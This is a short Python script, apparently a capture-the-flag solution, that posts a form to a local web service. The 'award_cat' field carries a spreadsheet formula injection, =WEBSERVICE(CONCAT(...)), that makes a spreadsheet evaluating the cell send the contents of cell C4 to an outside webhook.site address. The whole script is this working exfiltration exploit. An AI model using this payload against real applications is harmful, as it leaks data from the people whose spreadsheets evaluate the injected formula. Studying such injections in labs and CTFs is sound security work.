import requests

url = 'http://127.0.0.1:8000/' # edit
webhook = 'https://webhook.site/XXX' # edit
                                     # make sure to configure your webhook to return valid data

ctf_cat = "pwn"
award_cat = f"=WEBSERVICE(CONCAT(\"{webhook}?v=\",C4))"

r = requests.post(url, data={"award_cat": award_cat, "ctf_cat": ctf_cat})
